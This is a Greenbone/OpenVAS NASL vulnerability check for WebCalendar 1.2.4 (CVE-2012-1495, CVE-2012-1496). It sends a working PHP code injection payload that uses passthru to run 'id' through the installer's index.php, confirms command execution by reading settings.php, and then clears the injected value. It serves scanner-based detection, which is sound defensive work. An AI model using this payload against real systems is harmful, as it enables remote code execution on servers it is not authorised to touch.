if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103476" );
	script_bugtraq_id( 53207 );
	script_cve_id( "CVE-2012-1495", "CVE-2012-1496" );
	script_version( "2021-08-27T11:01:07+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "WebCalendar Local File Include and PHP code Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53207" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/webcalendar/?source=directory" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/522460" );
	script_tag( name: "last_modification", value: "2021-08-27 11:01:07 +0000 (Fri, 27 Aug 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-01-29 20:36:00 +0000 (Wed, 29 Jan 2020)" );
	script_tag( name: "creation_date", value: "2012-04-25 09:40:31 +0200 (Wed, 25 Apr 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "webcalendar_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "webcalendar/installed" );
	script_tag( name: "solution", value: "Reports indicate vendor updates are available. Please contact the
vendor for more information." );
	script_tag( name: "summary", value: "WebCalendar is prone to multiple input-validation vulnerabilities
because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to inject arbitrary PHP code and
include and execute arbitrary files from the vulnerable system in the
context of the affected application. Other attacks are also possible." );
	script_tag( name: "affected", value: "WebCalendar 1.2.4 is vulnerable, other versions may also be affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
CPE = "cpe:/a:webcalendar:webcalendar";
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
phpcode = "*/print(____);passthru(id);die;";
payload = "app_settings=1&form_user_inc=user.php&form_single_user_login=" + phpcode;
req = NASLString( "POST ", dir, "/install/index.php HTTP/1.1\\r\\n", "Host: ", get_host_name(), "\\r\\n", "Content-Length: ", strlen( payload ), "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Connection: close\\r\\n\\r\\n", payload );
res = http_send_recv( port: port, data: req );
if(!ContainsString( res, "HTTP/1.1 200" )){
	exit( 99 );
}
url = dir + "/includes/settings.php";
if(http_vuln_check( port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+.*" )){
	payload = "app_settings=1&form_user_inc=user.php&form_single_user_login=";
	req = NASLString( "POST ", dir, "/install/index.php HTTP/1.1\\r\\n", "Host: ", get_host_name(), "\\r\\n", "Content-Length: ", strlen( payload ), "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Connection: close\\r\\n\\r\\n", payload );
	res = http_send_recv( port: port, data: req );
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

